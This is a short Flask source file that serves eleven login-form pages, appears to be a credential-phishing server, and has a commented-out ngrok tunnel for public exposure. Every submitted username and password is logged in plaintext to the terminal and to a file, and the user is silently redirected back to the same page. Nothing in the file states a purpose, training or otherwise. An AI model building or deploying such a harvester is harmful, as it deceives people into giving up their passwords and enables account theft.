from flask import Flask, render_template, request, redirect, url_for
from datetime import datetime
import os

# REMOVED: from pyngrok import ngrok # <--- Removed ngrok import

app = Flask(__name__)

# Ensure log file exists
LOG_FILE = 'submissions.log'

def log_submission(page, username, password):
    """Log submission to terminal and file"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] Page: {page} | Username: {username} | Password: {password}\n"
    
    # Print to terminal
    print(log_entry.strip())
    
    # Append to log file
    with open(LOG_FILE, 'a') as f:
        f.write(log_entry)

@app.route('/')
def index():
    """Main index page"""
    return render_template('index.html')

@app.route('/page<int:page_num>', methods=['GET', 'POST'])
def page(page_num):
    """Handle pages 1-11 with login forms"""
    if page_num < 1 or page_num > 11:
        return "Page not found", 404
    
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        log_submission(f'page{page_num}', username, password)
        return redirect(url_for('page', page_num=page_num))
    
    return render_template(f'page{page_num}.html', page_num=page_num)

if __name__ == '__main__':
    # REMOVED: ngrok code block
    # public_url = ngrok.connect(5000)
    # print(f" * ngrok tunnel \"{public_url}\" -> \"http://127.0.0.1:5000\"")
    
    # Flask app runs with debug mode (reloader enabled)
    app.run(debug=True)
